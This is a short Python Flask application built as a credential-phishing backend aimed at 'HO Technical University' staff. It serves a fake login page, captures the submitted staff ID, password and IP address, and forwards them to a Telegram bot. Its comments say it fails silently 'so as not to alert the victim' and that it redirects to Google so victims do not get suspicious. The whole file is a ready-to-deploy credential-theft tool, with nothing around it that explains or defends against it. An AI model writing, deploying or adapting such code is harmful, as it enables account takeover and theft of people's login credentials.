from flask import Flask, request
import requests
import os

app = Flask(__name__)

# Get these from Render environment variables
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

# Read your HTML file
with open('index.html', 'r', encoding='utf-8') as f:
    HTML_PAGE = f.read()

@app.route('/')
def home():
    return HTML_PAGE

@app.route('/catch', methods=['POST'])
def catch():
    # Get credentials from the form
    staff_id = request.form.get('staff_id')
    password = request.form.get('password')
    ip = request.remote_addr
    
    # Prepare message for Telegram
    message = f"""🔐 HO TECHNICAL UNIVERSITY - LOGIN CAPTURED

📋 Staff ID: {staff_id}
🔑 Password: {password}
🌐 IP Address: {ip}
    """
    
    # Send to Telegram
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(telegram_url, data={
            'chat_id': CHAT_ID,
            'text': message
        }, timeout=5)
    except:
        pass  # Fail silently - don't alert the victim
    
    # Redirect victim to a real website (so they don't get suspicious)
    return '''
    <html>
        <head>
            <meta http-equiv="refresh" content="0; url=https://google.com">
        </head>
        <body>
            <p>Redirecting to portal...</p>
        </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
